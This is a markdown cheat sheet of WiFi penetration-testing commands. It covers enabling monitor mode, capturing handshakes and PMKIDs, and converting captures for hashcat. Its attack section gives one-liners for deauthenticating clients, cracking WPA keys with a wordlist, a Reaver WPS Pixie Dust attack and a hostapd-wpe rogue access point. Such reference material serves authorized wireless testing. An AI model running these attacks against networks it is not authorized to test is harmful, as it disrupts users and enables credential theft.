# Wifi

## monitor mode

### Kill conflicting processes

Kill processes that interfere with monitor mode.

```sh title:"Kill monitor-mode conflicting processes"
airmon-ng check kill
```
<!-- cheat -->

### Start monitor mode

Start monitor mode on a wireless interface.

```sh title:"Start monitor mode"
airmon-ng start "$wlan_interface"
```
<!-- cheat
var wlan_interface := wlan0
-->

### Stop monitor mode

Stop monitor mode on a monitor interface.

```sh title:"Stop monitor mode"
airmon-ng stop "$wlanmon_interface"
```
<!-- cheat
var wlanmon_interface := wlan0mon
-->

### Restart NetworkManager

Restart NetworkManager after monitor-mode work.

```sh title:"Restart NetworkManager"
systemctl restart NetworkManager
```
<!-- cheat -->

### Managed mode

Set a wireless interface back to managed mode.

```sh title:"Set WiFi interface to managed mode"
nmcli device set "$wlan_interface" managed true
```
<!-- cheat
var wlan_interface := wlan0
-->

## capture

### Monitor all

Monitor nearby wireless networks.

```sh title:"Monitor nearby WiFi networks"
airodump-ng "$wlanmon_interface"
```
<!-- cheat
var wlanmon_interface := wlan0mon
-->

### Monitor BSSID

Capture traffic for one BSSID on a channel.

```sh title:"Capture traffic for one BSSID"
airodump-ng --bssid "$bssid" -c "$channel" -w "$output_file" "$wlanmon_interface"
```
<!-- cheat
var bssid
var channel
var output_file
var wlanmon_interface := wlan0mon
-->

### PMKID capture

Capture WPA PMKID material with hcxdumptool.

```sh title:"Capture WPA PMKID with hcxdumptool"
hcxdumptool -i "$wlanmon_interface" -o "$capture_file" --enable_status=1 -c "$channel"
```
<!-- cheat
var wlanmon_interface := wlan0mon
var capture_file := capture.pcapng
var channel
-->

### Convert hcx capture

Convert a pcapng capture to hashcat 22000 format.

```sh title:"Convert hcx capture to hashcat 22000"
hcxpcapngtool -o "$hash_file" "$capture_file"
```
<!-- cheat
var hash_file := wifi.22000
var capture_file := capture.pcapng
-->

## attack

### Deauth client

Send deauthentication frames to a client.

```sh title:"Deauth WiFi client"
aireplay-ng --deauth "$deauth_count" -c "$client_mac" -a "$bssid" "$wlanmon_interface"
```
<!-- cheat
var deauth_count := 5
var client_mac
var bssid
var wlanmon_interface := wlan0mon
-->

### Crack PSK

Crack a captured handshake with a wordlist.

```sh title:"Crack WiFi handshake with aircrack-ng"
aircrack-ng -w "$wordlist" "$capture_file"
```
<!-- cheat
var wordlist
var capture_file
-->

### WPS pixiedust

Run Reaver Pixie Dust attack.

```sh title:"Run Reaver WPS Pixie Dust attack"
reaver -i "$wlanmon_interface" -b "$bssid" -c "$channel" -Z
```
<!-- cheat
var wlanmon_interface := wlan0mon
var bssid
var channel
-->

### Fake AP

Launch hostapd-wpe with a config.

```sh title:"Launch hostapd-wpe"
hostapd-wpe "$hostapd_conf"
```
<!-- cheat
var hostapd_conf := /etc/hostapd-wpe/hostapd-wpe.conf
-->

## monitor

### Kismet

Monitor WiFi with Kismet.

```sh title:"Monitor WiFi with Kismet"
kismet -c "$wlan_interface"
```
<!-- cheat
var wlan_interface := wlan0
-->
